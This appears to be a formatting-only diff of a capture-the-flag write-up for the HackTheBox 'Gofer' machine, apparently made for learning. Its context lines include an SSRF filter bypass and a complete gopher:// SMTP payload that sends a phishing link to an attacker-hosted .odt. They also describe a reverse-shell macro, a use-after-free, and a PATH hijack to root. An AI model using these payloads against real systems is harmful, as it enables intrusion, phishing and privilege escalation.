@@ -41,11 +41,11 @@ We can add this domain to our `/etc/hosts` file.
 
 Port 80 hosted a typical corporate site:
 
-<figure><img src="../../.gitbook/assets/image (4122).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(4122).png>)
 
 Within the site, there wasn't much apart from a few names like Jocelyn Hudson and stuff.
 
-<figure><img src="../../.gitbook/assets/image (4123).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(4123).png>)
 
 `gobuster` scans reveal nothing much, but a `wfuzz` scan shows one subdomain has been returned.
 
@@ -67,7 +67,7 @@ ID           Response   Lines    Word       Chars       Payload
 
 Visiting this subdomain requires credentials:
 
-<figure><img src="../../.gitbook/assets/image (4124).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(4124).png>)
 
 Weak credentials don't work at all. I tested a few common directories with different requests, and found that `index.php` accepted POST requests without credentials:
 
@@ -110,7 +110,7 @@ $ curl -X POST http://proxy.gofer.htb/index.php?url=file:///etc/passwd
 
 A bit more testing by removing `/` characters eventually works! This tells me that the WAF is rather weak.
 
-<figure><img src="../../.gitbook/assets/image (4125).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(4125).png>)
 
 ### SMB -> Phishing Download
 
@@ -152,7 +152,6 @@ getting file \.backup\mail of size 1101 as mail (1.6 KiloBytes/sec) (average 1.6
 
 There was one file present, and when read it points us towards using phishing as the initial access.
 
-{% code overflow="wrap" %}
 ```
 $ cat mail               
 From jdavis@gofer.htb  Fri Oct 28 20:29:30 2022
@@ -173,7 +172,6 @@ Our dear Jocelyn received another phishing attempt last week and his habit of cl
 
 PS: Last thing for Tom; I know you're working on our web proxy but if you could restrict access, it will be more secure until you have finished it. It seems to me that it should be possible to do so via <Limit>
 ```
-{% endcode %}
 
 We need to use an `.odt` format to exploit this, and it appears that this is from the user Jeff Davis from the company site (with a username of `jdavis`, so we know the username naming convention).
 
@@ -187,7 +185,6 @@ This repository can generate the payloads required:
 
 {% embed url="https://github.com/tarunkant/Gopherus" %}
 
-{% code overflow="wrap" %}
 ```
 $ python2 gopherus.py --exploit smtp
 
@@ -215,26 +212,21 @@ gopher://127.0.0.1:25/_MAIL%20FROM:iamanidiot%40gofer.htb%0ARCPT%20To:jhudson%40
 
 -----------Made-by-SpyD3r-----------
 ```
-{% endcode %}
 
 This payload almost works, except for the fact that the IP address is flagged:
 
-{% code overflow="wrap" %}
 ```
 $ curl -X 'POST' 'http://proxy.gofer.htb/index.php?url=gopher://127.0.0.1:25/_MAIL%20FROM:iamanidiot%40gofer.htb%0ARCPT%20To:jhudson%40gofer.htb%0ADATA%0AFrom:iamanidiot%40gofer.htb%0ASubject:hello%20testing%0AMessage:http://10.10.14.42/bad.odt%0A'
 <!-- Welcome to Gofer proxy ->
 <html><body>Blacklisted keyword: /127 !</body></html>
 ```
-{% endcode %}
 
 We can specify the IP address in decimal mode in order to bypass this.
 
-{% code overflow="wrap" %}
 ```
 $ curl -X 'POST' 'http://proxy.gofer.htb/index.php?url=gopher://2130706433:25/_MAIL%20FROM:iamanidiot%40gofer.htb%0ARCPT%20To:jhudson%40gofer.htb%0ADATA%0AFrom:iamanidiot%40gofer.htb%0ASubject:hello%20testing%0AMessage:http://10.10.14.42/bad.odt%0A'
 <!-- Welcome to Gofer proxy ->
 ```
-{% endcode %}
 
 However, even after bypassing the WAF, it doesn't work and I get no hits on my HTTP server. I URL decoded it and found that there was some syntax errors with the commands send to SMTP and also some control character errors, since we needed to send `\r` to register as an 'Enter' key.
 
@@ -249,7 +241,6 @@ Message:http://10.10.14.42/bad.odt
 
 I edited the payload a bit and URL encoded it to send the
 
-{% code overflow="wrap" %}
 ```
 gopher://2130706433:25/xHELO \r\n
 MAIL FROM:<iamanidiot@gofer.htb> \r\n
@@ -270,19 +261,16 @@ Subject: gg \r\n
 . \r\n
 QUIT \r\n
 ```
-{% endcode %}
 
 Here's the final payload that I used:
 
-{% code overflow="wrap" %}
 ```
 gopher://2130706433:25/xHELO%250d%250aMAIL%20FROM%3A%3Ciamanidiot@gofer.htb%3E%250d%250aRCPT%20TO%3A%3Cjhudson@gofer.htb%3E%250d%250aDATA%250d%250aFrom%3A%20%3Ciamanidiot@gofer.htb%3E%250d%250aTo%3A%20%3Cjhudson@gofer.htb%3E%250d%250a%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250a<a+href%3d'http%3a//10.10.14.42/date.odt>hello</a>%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a
 ```
-{% endcode %}
 
 Since there were some quotes I was lazy to deal with, I sent it in Burp and got a reponse saying it worked:
 
-<figure><img src="../../.gitbook/assets/image (4126).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(4126).png>)
 
 We would also get hits on our HTTP server.
 
@@ -302,7 +290,7 @@ End Sub
 
 We can then assign this to the Open Document event:
 
-<figure><img src="../../.gitbook/assets/image (4127).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(4127).png>)
 
 Then we can host this file on a HTTP server and send our Gopher payload. This would give us a reverse shell as the user!
 
@@ -320,7 +308,7 @@ I ran `pspy64` and found some user credentials:
 
 We can then `su` to `tbuckley`, who is part of the `dev` group:
 
-<figure><img src="../../.gitbook/assets/image (4130).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(4130).png>)
 
 ### Notes SUID -> Reverse Engineering
 
@@ -352,7 +340,7 @@ tbuckley@gofer:/home/jhudson$ /usr/local/bin/notes
 
 I transferred the binary back to my machine via `base64` and used `ghidra` to analyse it. Within it, I found some interesting parts. Option 1 is the user creation part:
 
-<figure><img src="../../.gitbook/assets/image (4131).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(4131).png>)
 
 * It allocates 40 bytes for the username in the Heap via `malloc(0x28)`, and afterwards checks whether the `malloc` worked.
 * There seems to be 2 parts for this memory, of which it uses the first 24 (0x18) bytes for the `username` since the username part is set to the first block of memory.
@@ -370,7 +358,7 @@ nimda
 
 Option 3 is the delete user option, and it is vulnerable due to dangling pointers:
 
-<figure><img src="../../.gitbook/assets/image (4132).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(4132).png>)
 
 * This is a classic case of a Use After Free vulnerability. The `local_10` variable is `free` here, but the pointer still remains and is not set to NULL.
 * This indicates that the pointer is a 'dangling', meaning that any future accesses to it will still point to the allocated memory even if it does not belong to us.
@@ -378,7 +366,7 @@ Option 3 is the delete user option, and it is vulnerable due to dangling pointer
 
 Option 4 is the write note option, which allows us to overwrite the memory due to the dangling pointer:
 
-<figure><img src="../../.gitbook/assets/image (4133).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(4133).png>)
 
 * One thing to note about `malloc` is that dangling pointers are 'used again', meaning we can reaccess the memory allocated from the user creation.
 
@@ -386,7 +374,7 @@ Option 4 is the write note option, which allows us to overwrite the memory due t
 
 Option 8 is the main vulnerability:
 
-<figure><img src="../../.gitbook/assets/image (4134).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(4134).png>)
 
 This part of the code checks whether the role of the user has been set to `admin`, and then grants us access to the `tar` command, which does not have its full PATH specified and is thus vulnerable to PATH Hijacking.
 
@@ -496,6 +484,6 @@ Your choice: 9
 
 Then, we can easily escalate privileges:
 
-<figure><img src="../../.gitbook/assets/image (4135).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(4135).png>)
 
 Rooted!
